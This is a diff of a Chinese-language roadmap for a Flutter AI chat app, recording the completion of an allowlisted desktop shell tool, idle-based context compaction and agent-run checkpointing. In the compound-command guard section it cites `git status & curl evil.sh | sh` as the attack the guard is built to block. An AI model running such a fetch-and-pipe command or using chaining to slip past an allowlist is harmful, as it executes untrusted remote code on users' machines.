@@ -39,10 +39,10 @@
 | # | 項目 | 藍圖 | 狀態 | 建議版本 |
 |:--|:--|:--|:--:|:--|
 | P0-3(尾) | legacy 傳輸層工具迴圈移除（+ Neuralwatt parity 可選） | kelivo providers 分層 | ✅（2026-11-06：四條 transport 迴圈全刪、`onToolCall`／`exposeToolCallsOnly` 退場、kill-switch 移除；見 `docs/P0-3_legacy_tool_loop_removal_plan.md`） | v1.29.x |
-| P1-2(尾) | `cache_expiry` 觸發（30 分鐘閒置壓縮） | AnyBuff 觸發器 | ⬜ | v1.30.x |
-| P1-6 | 桌面開發者模式 + Allowlist Shell（`shell_run`）**＋ kelivo 導入增量** | ADR-A8/A9 + 執行契約已內化於 §2.2（原 CLI v4 §五/§六）+ kelivo workspace | ⬜ | v1.29.x |
+| P1-2(尾) | `cache_expiry` 觸發（30 分鐘閒置壓縮） | AnyBuff 觸發器 | ✅（2026-11-06：以最後成功 usage 為活動錨點；見 §2.3） | v1.30.x |
+| P1-6 | 桌面開發者模式 + Allowlist Shell（`shell_run`）**＋ kelivo 導入增量** | ADR-A8/A9 + 執行契約已內化於 §2.2（原 CLI v4 §五/§六）+ kelivo workspace | ✅（2026-11-06；見 §2.2 落地紀錄） | v1.29.x |
 | P1-8 | file_edit 三段式容忍匹配（kelivo 導入，**即刻可做**） | kelivo `edit_matchers.dart`（RikkaHub TextReplacers 移植） | ✅ | v1.29.x |
-| P2-1 | Checkpoint 持久化（durable-before-dispatch） | deepseek-harness | ⬜ | v1.30.x |
+| P2-1 | Checkpoint 持久化（durable-before-dispatch） | deepseek-harness | ✅（2026-11-07：`agent_runs_v1`＋啟動恢復橫幅；見 §2.4） | v1.30.x |
 | P2-2 | 背景長任務（桌面托盤 + Android 前景服務） | 既有基建 + P2-1 | ⬜ | v1.31.x |
 | P2-3 | 子代理（`spawn_subagent`） | AnyBuff agents/ + AiTeamController | ⬜ | v1.31.x |
 | P2-4 | Mini dev server + Live 預覽 | 既有 `html_preview_*` + 新 dev server | ⬜ | v1.31.x |
@@ -107,7 +107,7 @@
   P2-4 Dev server + Live 預覽 ──→ P3-1 瀏覽器 QA（要有持續開著的頁面才有得驗證）
 
 【Wave E：上下文治理補強（互相獨立，可穿插）】
-  P1-2 尾款 cache_expiry ｜ P2-6 L3 檔案地圖
+  P1-2 尾款 cache_expiry（✅）｜ P2-6 L3 檔案地圖
 
 【Wave F：擴充與拋光】
   P2-3 子代理 ｜ P3-5 Plan Mode ｜ P1-1 尾款 diff viewer
@@ -145,10 +145,13 @@
 
 ---
 
-### 2.2 P1-6 桌面開發者模式 + Allowlist Shell（`shell_run`）⬜
+### 2.2 P1-6 桌面開發者模式 + Allowlist Shell（`shell_run`）✅【2026-11-06 完成】
 
 > **藍圖**：原《CLI 工具整合計畫 v4》§三~§六、§八——執行工程契約**已逐項內化於下文**（原文已封存，不需回查）；其 blocking 確認框不採（ADR-A9）。命名維持 `shell_run`。
-> **Phase 1 最後一項未動工的功能**；手冊 §7.2 官方待辦第一條。
+> **Phase 1 最後一項功能（2026-11-06 落地）**；手冊 §7.2 官方待辦第一條。
+>
+> **落地紀錄（2026-11-06）**：新增 `lib/core/services/shell/`——`shell_policy.dart`（allow/ask/deny、複合命令逐段、`programsIn` 正規化）、`cli_process_supervisor.dart`（只用 `Process.start()`、collectors 先於 wait、超 cap 持續 drain、timeout/cancel 以 Job Object 終止整棵樹、`taskkill /T` fallback、UTF-8 `allowMalformed`）、`windows_job_object.dart`（純 `dart:ffi`，未新增 `win32`/`ffi` 直接相依）、`changed_files.dart`（`(mtime,size)` 前後快照、cap 20k/50）、`tool_run_registry.dart`（50ms 節流、ANSI/`\r`、200 行/32KB、LRU 200/8MB）、`shell_run_service.dart`（dev mode/PATH readiness、cwd/timeout、env allowlist＋五旗標、secret 遮蔽、結構化 payload、>32KB 外部化）。輸出落 `{appSupport}/tool_outputs/{conversationId}/{toolCallId}.txt`；`session_outputs.dart` 提供 sweep（20 檔/7 天）與刪除清理，`FileToolService` 新增唯讀 zone（僅 `file_read`/`file_search`，寫入一律拒）。設定新增 `developer_mode_v1`／`shell_allowlist_v1`（皆同步，見 §5.7）；strict 沿用既有 `approval_strict_mode_v1`，不新增重複開關。UI：設定→Developer mode（總閘、allowlist、PATH probe）、Workspace Tools 條件列、審批卡完整命令/blocked programs、工具卡 `ShellLiveTail`；l10n 四語系。測試新增 `shell_policy_test`／`session_outputs_test`／`tool_output_read_test`／`cli_process_supervisor_test`／`shell_run_service_test`；2026-11-06 review 修正再加入 `changed_files_test`，相關 10 檔 142 案全綠。`flutter analyze --no-pub` 0 errors（既有 warnings/info 不計）。
+> **與計畫的差異**：stdout/stderr 捕獲上限由 24KB/6KB 提高為 1MB/256KB——原上限合計 30KB，使 >32KB 外部化分支永遠不可達；模型端仍由 `ToolResultCaps` 限 32,768 字元（手冊 §5.1 第 7 點）。
 
 **目標**：桌面（Windows）提供受控的命令執行工具 `shell_run`，以「開發者模式」總閘 + 三層命令政策實現可監督的 shell 能力；Android 不提供。
 
@@ -162,10 +165,10 @@
 
 **命令級政策細節**：
 - allowlist 內（含複合守衛通過）→ 直跑；**allowlist 外 → ask**（Pending 卡顯示完整命令，使用者「本次允許 / 永遠允許（寫回 allowlist）/ 拒絕」；拒絕回結構化 error JSON，模型可調整方向）。
-- **複合命令守衛**：命令含 `&&`、`;`、`|`、`$()`、backtick 時，**每一段**首 token 都必須在 allowlist 才免審，否則整條落 ask——關閉 `git status && curl evil.sh | sh` 型攻擊面。
+- **複合命令守衛**：命令含 `&&`、單一 `&`、`;`、`|`、`$()`、backtick 時，**每一段**首 token 都必須在 allowlist 才免審，否則整條落 ask——關閉 `git status & curl evil.sh | sh` 型攻擊面；`2>&1`／`<&0` 的 redirection ampersand 不切成新命令。
 - strict 模式 toggle（偏好硬擋者）可把 ask 全降為 deny。
 
-**工具參數（kelivo 對照補齊）**：`command`（必填）；`cwd`（選填，限 workspace 內並 `p.normalize`，預設 workspace 根）；`timeout_seconds`（選填，預設 900、clamp 1–3600——與 process tree kill 共用同一 timeout 來源，不另設第二個計時器）。
+**工具參數（kelivo 對照補齊）**：`command`（必填）；`cwd`（選填，限 workspace 內、canonical symlink 後仍須在 workspace，預設 workspace 根）；`timeout_seconds`（選填，預設 900、clamp 1–3600——與 process tree kill 共用同一 timeout 來源，不另設第二個計時器）。
 
 **Process 執行契約（原 CLI v4 §五/§六，逐項採納——已內化於下）**：
 - 一律 `Process.start()`，**禁止 `Process.run().timeout()`**——pipes 未讀 → 大輸出 pipe deadlock；Future timeout 不殺子程序。
@@ -202,44 +205,46 @@
 5. **ToolRun 即時串流**（UI 增強）：執行中工具卡顯示即時輸出——50ms 節流 notify、ANSI CSI 解析（`\r` 進度行替換，npm/ffmpeg 進度條不洗屏）、UTF-8 chunk-safe 解碼、bounded tail（200 行/32KB）、LRU 驅逐（200 條/8MB）、`finishHandoff` 防模型未交接即被驅逐；與 `CliProcessSupervisor` 的 collectors drain 接線（drain 位元組餵給 ToolRun）。**整合語意（明確定義）**：registry key＝`(conversationId, toolCallId)`（P1-4 id-aware 契約已貫通，kernel/legacy 皆帶 provider call id）；工具卡以 `ChangeNotifier` 訂閱**疊加**在已持久化 tool event 之上；**reload／跨頁面僅剩終態**（registry 為 process-lifetime，重啟後由 tool event 顯示最終輸出，無即時 tail）——測試需覆蓋此行為。
 6. **（可選）桌面 companion**：`revealInFileManager` / `openInSystemTerminal`（在檔案總管顯示／開系統終端機）；行動 in-app terminal 見 §2.17（依賴 P2-5 的沙盒 PTY）。
 
-**合規**：更新 `STORE_REVIEW_PLAN.md`——MSIX/WACK 重跑（shell 能力敘述）、F-Droid metadata（Android 不受影響）；手冊 §5.1 新增「外部程序治理」子節、§3.1 措辭更新（「預設沙盒；沙盒外寫入需逐次明示核准」）。
+**文件**：手冊 §5.1 新增「外部程序治理」子節、§3.1 措辭更新（「預設沙盒；沙盒外寫入需逐次明示核准」）。
 
-**測試（重點矩陣）**：三層政策（allowlist 內含複合守衛通過直跑；外 → ask 不再即時拒絕；strict 降級）、複合命令守衛（`&&`/`;`/`|` 切分後每段首 token 皆須在清單）、「永遠允許」寫回 allowlist、dev-mode 關閉時工具不注入/呼叫被拒；process 契約——collectors 先於 wait 建立、超 cap 持續 drain、timeout 終止整個 process tree（Job Object）、cancellation 不被吞且子程序與 collectors 皆回收、parent environment 不完整繼承、tool exception 不中斷 stream（error JSON 透傳）、cwd 限縮 workspace 內、CJK/cp950 編碼、foreground FIFO 排隊、secret 遮蔽；AI Team slot 繼承 shell tools（deny/非成員回傳 result 不中斷流程）。**kelivo 導入增量**：50ms 節流與 tail/LRU 上限、ANSI 進度行替換（`\r`）、changed_files 快照（新增/修改、同 mtime 不同 size 可偵測、cap 20k 截斷）、`output_file` 外部化 round-trip（>32KB 觸發、preview 4KB、唯讀 zone 讀取、寫入被拒、retention 20 檔/7 天與刪除清理）、shell payload 總長 ≤32,768（F1 教訓）、`timeout_seconds` clamp（1–3600、預設 900）與 `cwd` 越界拒絕、ToolRun reload 後僅終態。
+**測試（重點矩陣）**：三層政策（allowlist 內含複合守衛通過直跑；外 → ask 不再即時拒絕；strict 降級）、複合命令守衛（`&&`/單一 `&`/`;`/`|` 切分後每段首 token 皆須在清單；`2>&1` 不切分）、「永遠允許」寫回 allowlist、dev-mode 關閉時工具不注入/呼叫被拒；process 契約——collectors 先於 wait 建立、超 cap 持續 drain、timeout 終止整個 process tree（Job Object）、cancellation 不被吞且子程序與 collectors 皆回收、parent environment 不完整繼承、tool exception 不中斷 stream（error JSON 透傳）、cwd 限縮 workspace 內（含 symlink 逃逸拒絕）、CJK/cp950 編碼、foreground FIFO 排隊、secret 遮蔽；AI Team slot 繼承 shell tools（deny/非成員回傳 result 不中斷流程）。**kelivo 導入增量**：50ms 節流與 tail/LRU 上限、ANSI 進度行替換（`\r`）、changed_files 快照（新增/修改、同 mtime 不同 size 可偵測、cap 20k 截斷且截斷時不誤報刪除）、`output_file` 外部化 round-trip（>32KB 觸發、preview 4KB、唯讀 zone 讀取、寫入被拒、retention 20 檔/7 天、對話刪除與 clearAll／restore 清理）、shell payload 總長 ≤32,768（F1 教訓）、`timeout_seconds` clamp（1–3600、預設 900）與 `cwd` 越界拒絕、ToolRun reload 後僅終態。
 
 ---
 
-### 2.3 P1-2(尾) `cache_expiry` 觸發（v1.4 決策延後 Phase 2）⬜
+### 2.3 P1-2(尾) `cache_expiry` 觸發 ✅【2026-11-06 完成】
 
 **目標**：30 分鐘閒置後的機會式壓縮觸發——閒置超過門檻時 prompt cache 已冷，此時壓縮不再付出「cache 前綴失效」的代價，可提前把 context 壓回健康區。
 
-**現況**：P1-2 已全量落地（R0/L0/L1/觸發公式/mid-run 重評估）；`cache_expiry` 是 v1.4 裁定延後的唯一子項（「機會式優化非核心；cache 互咬已由 marker 凍結切點＋成批壓縮處理」）。
+**落地紀錄（2026-11-06）**：`compaction_trigger.dart` 新增 `cacheExpiryIdleThreshold`（30 分鐘）與 `latestSuccessfulRequestAt()`；generation prep 將最後一個 **具 `promptTokens` 且已完成**的 assistant 訊息時間傳入 trigger，作為成功請求錨點。`evaluateCompactionTrigger` 現在是「token 門檻 OR cache-expiry」：閒置達標時跳過 `trigger(W)` 門檻，但仍先過 140k floor，後續切點／tail／version-group 防護完全沿用。未修改 conversation/SQLite schema：`promptTokens` 已是既有持久化訊號；沒有 usage 的重試／失敗訊息不會推進錨點，live placeholder（`isStreaming`）也排除。新增 `test/compaction/cache_expiry_test.dart`（29m59s／30m01s 邊界、floor、正常公式、未來時鐘、成功錨點選擇）。
 
-**實作內容**：
-1. 記錄每對話最後活動時間（`usage.promptTokens` 已隨訊息持久化，活動時間可比照掛在 conversation metadata）。
-2. generation prep 的觸發評估（`compaction_trigger.dart` 同位置）加第二路徑：`now - lastActivity > 30min` → **跳過 promptTokens 門檻、直接執行觸發評估**（仍尊重 140k floor 與切點安全）。
-3. 與 §3.5 prompt caching 的互動驗證——閒置判定必須以「上次成功請求」為準，重試/失敗請求不算活動。
+**與原計畫的差異**：原計畫建議把活動時間掛在 conversation metadata；實作改為從既有訊息 usage 推導最後成功請求時間，避免為單一 cache 優化 bump SQLite schema／安裝閘門版本。代價是時間錨點精度為「請求訊息時間（有 `processFinishedAt` 時優先）」，不是每次 API 成功回應的精確毫秒。
 
 **測試**：閒置邊界（29min59s 不觸發 / 30min01s 觸發）、floor 尊重、與 trigger 公式並存的優先序、活動時間以成功請求為準。
+
+**2026-11-07 review 修正（已完成）**：mid-run 壓縮不再把 kernel 的累計 `tokensSoFar` 當 prompt 大小（同一段 100k context 跑多輪會被誤判為數十萬）；改由 driver 以「最後一輪 `usage.promptTokens` 與 working list 估算取大」計算 `promptTokens`，累計值只留給 token budget；step 0 仍只由 prep-time 評估。prep-time 新增 `evaluatePrepTimeCompaction()` 接線測試與 exact 30:00 邊界；`processFinishedAt` 的精度註記已改為「多數情況是最後一輪正文開始或純工具輪完成回填，非 usage 落盤時間」。
 
 **風險**：壓縮 × cache 互咬（§7）——注入位置穩定與 marker 凍結切點原則不變。
 
 ---
 
-### 2.4 P2-1 Checkpoint 持久化（durable-before-dispatch）⬜
+### 2.4 P2-1 Checkpoint 持久化（durable-before-dispatch）✅
 
 > **藍圖**：deepseek-harness `session-checkpoint-policy` + `SessionWriteBehind` 語意，**Hive 輕量版**——messages/tool events 已持久化，只需補 step 邊界 + pending 落地 + resume 進入點。ADR-A7 翻案手冊 §3.10「不做 L3 整輪恢復」（該 ADR 的時代假設「聊天＝短任務」在 agent run 時代不成立）。
 
 **目標**：agent run 的中途狀態跨程序存活——app 被殺（Android phantom process、OEM 背景回收、Windows 崩潰、誤關視窗）後，長任務可從斷點恢復，不從頭重跑、不重付 token。
 
-**實作內容**：
-1. 新 Hive box **`agent_runs_v1`**：`{conversationId, messageId, stepIndex, pendingApprovals, todos, usage, roundMessages ref}`。
-2. **durable-before-dispatch 三邊界**：模型請求的前綴未落地，不得發出請求；工具結果未落地，不得進下一步；step 完成標記落地。
-3. 寫入走 **~200ms debounce 批次**（`SessionWriteBehind` 語意）；含 corruption 偵測。
-4. app 啟動偵測未完成 run → 橫幅「繼續任務？」→ 走既有 **`resumeRun`** facade（已存在：ask_user pending → `resumeAfterAskUserAnswer`、approval pending → `resolveApproval`、bare → `_continueAfterApproval`——checkpoint 將直接呼叫此入口）。
+**落地內容（2026-11-07）**：
+1. 新 Hive box **`agent_runs_v1`**（`AgentRunCheckpointStore`）：以 `conversationId` 為 key，存 `{schemaVersion, conversationId, assistantMessageId, stepIndex, tokensSoFar, phase, updatedAtMs, pendingTools[], softStopReason}`。`pendingTools` 只記 `approval`／`ask_user` 的 id/name；完整 approvals 與 tool 結果仍以 `tool_events_v1` 為權威來源。
+2. **durable-before-dispatch 三邊界**：`onRoundStart` 先 `put + flush` 才 dispatch；工具結果在 `upsertToolEvent` 完成後才推進；`onRoundEnd` 落 step 完成標記。寫入採 eager flush（非 200ms debounce）——目前每個邊界都要求 crash 安全，批次化留給 P2-2 背景任務再優化。
+3. **終態分類**：正常完成與使用者取消清除 checkpoint；approval／ask_user 暫停、串流中斷、`max_steps`／`token_budget` soft stop 保留；corrupt/非字串列在讀取時刪除，不阻塞啟動。
+4. app 啟動 `HomePageController.initChat` 讀取最新 checkpoint → 顯示「上次任務尚未完成」橫幅；pending 卡只導航回對話讓使用者操作卡片，bare run 才呼叫既有 **`resumeRun`** facade。
+5. 生命週期清理：對話刪除、`clearAllData`／`clearAllChatRows`、reset／legacy rebuild、backup restore 成功後清除；不進 backup／sync。
 
-**同步歸類（需先裁定）**：原計畫 §7 風險表列 `agent_runs` 為**裝置本地（排除備份）**，附B 卻列為「入備份」——兩處矛盾，實作前裁定（建議：裝置本地——run 狀態綁定本機程序生命週期，跨裝置恢復語意不成立；若裁定入備份則隨附B 的 backup 升版流程走）。
+**同步歸類（已裁定）**：**裝置本地、排除備份**。run 狀態綁定本機程序生命週期，跨裝置恢復語意不成立；因此不加入 `_localOnlyKeys`，也不進 `chatHiveFiles` 的白名單。
 
-**測試**：durable 邊界單元測試（fake clock + 寫入注入——OS 無法穩定製造 crash，比照 `debugWriteTemp` seam 慣例）、debounce 批次語意、啟動偵測 → 橫幅 → resume 全鏈、corruption 偵測、step 完成標記與 `upsertToolEvent` 既有 approvalState 保留語意的相容（P0-2 修復不得回歸）。
+**測試**：`test/agent_checkpoint` 6 tests（model round-trip、非法欄位、未知 phase、store 最新選擇、corrupt row 清理、delete/clear）；既有 `test/approval_lifecycle_test.dart`＋`test/core/services/agent/agent_loop_test.dart` 18 tests、`test/compaction` 99 tests 全數通過。UI 橫幅與實際重啟流程尚未做真機／桌面視覺 smoke，列為後續驗證。
+
+**2026-11-07 review 修正（已完成）**：checkpoint 生命週期抽成 `AgentRunJournal`（`agent_run_journal.dart`）——durable-before-dispatch、pending 三態（known pending／known none／unknown）、run fence、終態分類都可單測（新增 `test/agent_checkpoint/agent_run_journal_test.dart`）。寫入失敗首次即降級為本 session 停用 journal 並記錄一次 log，不再讓 generation 直接失敗；`onToolResults` 只在 pending 出現／解除時落盤，其餘批次到 `onRoundEnd`。啟動橫幅改為 stream 終態／取消／切換對話時重新讀 store，resume 前再 `load()` 一次並擋 `loadingConversationIds`；使用者 dismiss 的 checkpoint 會以 key 記住，不會被刷新拉回。`pendingTools` 讀不到時回 unknown，終態保留既有 checkpoint。`AgentRunCheckpoint` 加 optional `runId`，store 刪 corrupt row 後 flush。
 
 **kelivo 對照（§0.5）**：其 `ConversationToolPermissions` 的工程——授權屬於對話而非前景頁、寫入序列化尾巴、revision fencing、`context_changed` 例外——是 pendingApprovals 落地與「審批卡跨頁面／跨對話切換一致」的直接參考（抄語意不抄碼）。
 
@@ -471,10 +476,9 @@ P1-1 落地時 `file_edit` 已有**預覽 diff**（`buildEditPreviewDiff`：確�
 | 風險 | 緩解 |
 |:--|:--|
 | **Reasoning echo 回歸**（P0-3 移除舊路徑時的最大風險）：中立格式 follow-up 若丟失 `reasoning_content`/`reasoning_details`/Gemini thought sig，DeepSeek/Kimi/OpenRouter 多輪工具會降智或報錯 | kernel `assistantExtras` 已貫通 + body 逐位元組對照測試鎖死（kelivo `0f44150` 為前車之鑑）；移除舊迴圈時 parity 測試必跑 |
-| **壓縮 × prompt cache 互咬** | marker 凍結切點 + 成批壓縮 + 注入位置穩定；P2-6(L3) 檔案地圖以 mtime 為失效鍵，未變則逐字相同；cache_expiry 僅在 cache 已冷時觸發 |
+| **壓縮 × prompt cache 互咬** | marker 凍結切點 + 成批壓縮 + 注入位置穩定；P2-6(L3) 檔案地圖以 mtime 為失效鍵，未變則逐字相同；cache_expiry 已落地（2026-11-06），僅在最後成功 usage 閒置 ≥30 分鐘時觸發 |
 | **兩把 token 尺**（預算 `chars/3` vs 閾值 usage 實測） | 觸發一律以 usage 實測為準；chars 估算僅作內部預算 |
 | **Windows 穩定性**（P1-6/P2-5）：pipe deadlock、孤兒子程序樹、cp950 亂碼 | shell 串行、collectors-first drain、Job Object tree-kill、環境 allowlist、secret 遮蔽；手冊 §5.1「外部程序治理」子節隨落地補上 |
-| **商店合規**（P1-6/P2-5）：shell/腳本能力改變 MSIX/F-Droid 審查敘事 | ADR-A8 政策分級：hard floor 不變；出界 → ask 屬「分層同意」敘事；`STORE_REVIEW_PLAN.md` 隨 P1-6 更新；WACK 重跑；P2-5 開工前對照 F-Droid（GPL source offer） |
 | **同步分類（§5.7）** | `developer_mode_v1`、shell allowlist、審批政策 = 全域偏好（同步）；`agent_runs_v1` = 裝置本地（**與附B 矛盾處隨 P2-1 裁定**，見 §2.4） |
 | **Dart `async*`**：`yield*` 於 try/catch 的例外穿透限制 | kernel/driver/新服務一律 `await for` + `yield`（§3.10 守則） |
 | **voice/AI Team 路徑** | 主線不動 + 回歸測試（`chat_turn_service_test`、AI Team smoke）；P2-3 子代理沿用串行先例 |
@@ -507,7 +511,6 @@ flutter test                    # 新增測試 + 既有回歸（700+ 案全綠�
 | §5.7 `_localOnlyKeys` | 新鍵值歸類審查（`developer_mode_v1`/allowlist 同步；`agent_runs_v1` 本地） | P1-6 / P2-1 |
 | §3.14 Agent Runtime | checkpoint、背景任務、子代理、Plan Mode 各小節隨落地補記 | P2-1 起 |
 | §7 現狀與待辦 | 各項完成後更新 roadmap（並標記本計畫為 Cowork 剩餘項目的權威清單） | 每版本 |
-| `STORE_REVIEW_PLAN.md` | P1-6 合規敘事更新 + WACK 重跑記錄 | P1-6 |
 | §3.1 檔案工具 | `file_edit` 匹配策略（三段降級、ambiguous 策略標示）隨落地補記 | P1-8 |
 
 ---
